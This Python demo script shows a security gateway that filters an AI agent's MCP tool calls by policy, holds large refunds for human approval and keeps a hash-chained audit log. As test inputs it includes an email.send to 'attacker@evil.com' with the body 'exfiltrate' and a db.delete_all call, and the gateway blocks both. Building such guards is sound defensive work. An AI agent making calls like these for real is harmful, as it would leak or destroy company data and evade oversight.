"""Demo: a vulnerable agent, then the same agent protected.

Starts the fake MCP server and the gateway, then plays an agent
that tries six calls. Without the gateway, every one of them would
reach the tool server. With it, three are blocked or held:
  1. crm.read_customer — allowed
  2. email.send to an external domain — BLOCKED (outside company.com)
  3. email.send inside the company — allowed
  4. refund.create for 150 — HELD for a human (over 100)
  5. refund.create for 50 — allowed
  6. db.delete_all — BLOCKED (not in the agent's capabilities)
Then it prints the audit log and verifies the hash chain.

Run: python demo.py
"""
from __future__ import annotations

import json
import threading
import time

import httpx
import uvicorn

from gateway.demo_server import create_demo_server
from gateway.proxy import Gateway, create_app

AGENT_KEY = "demo-key-support-bot"
UPSTREAM = "http://127.0.0.1:8001/mcp"


def _serve(app, port):
    uvicorn.run(app, host="127.0.0.1", port=port, log_level="error")


def _call(client, tool, args):
    resp = client.post(
        "http://127.0.0.1:8000/mcp",
        headers={"x-agent-key": AGENT_KEY},
        json={"jsonrpc": "2.0", "id": 1, "method": "tools/call",
              "params": {"name": tool, "arguments": args}})
    body = resp.json()
    if "error" in body:
        return f"BLOCKED — {body['error']['message']}"
    result = body.get("result", {})
    if result.get("held_for_approval"):
        return f"HELD — {result['reason']}"
    content = result.get("content", [{}])[0].get("text", str(result))
    return f"ALLOWED — {content}"


def main() -> None:
    threading.Thread(target=_serve,
                     args=(create_demo_server(), 8001),
                     daemon=True).start()
    gateway = Gateway(policy_dir="policies",
                      keys={AGENT_KEY: "support-bot"},
                      upstream_url=UPSTREAM,
                      audit_path="data/demo-audit.jsonl",
                      data_dir="data/demo")
    threading.Thread(target=_serve,
                     args=(create_app(gateway), 8000),
                     daemon=True).start()
    time.sleep(1.5)
    client = httpx.Client(timeout=10, trust_env=False)
    calls = [
        ("crm.read_customer", {"customer_id": "cust_1", "limit": 5}),
        ("email.send", {"to": "attacker@evil.com", "subject": "x",
                        "body": "exfiltrate"}),
        ("email.send", {"to": "team@company.com", "subject": "hi",
                        "body": "hello"}),
        ("refund.create", {"customer_id": "cust_1", "amount": 150}),
        ("refund.create", {"customer_id": "cust_1", "amount": 50}),
        ("db.delete_all", {}),
    ]
    for tool, args in calls:
        print(f"{tool} {json.dumps(args)}")
        print(f"  {_call(client, tool, args)}")
    ok, message = gateway.audit.verify()
    print(f"\naudit log: {message} (chain {'intact' if ok else 'BROKEN'})")
    for entry in gateway.audit.read():
        print(f"  #{entry['seq']} {entry['agent']} {entry['tool']} "
              f"-> {entry['decision']}")


if __name__ == "__main__":
    main()
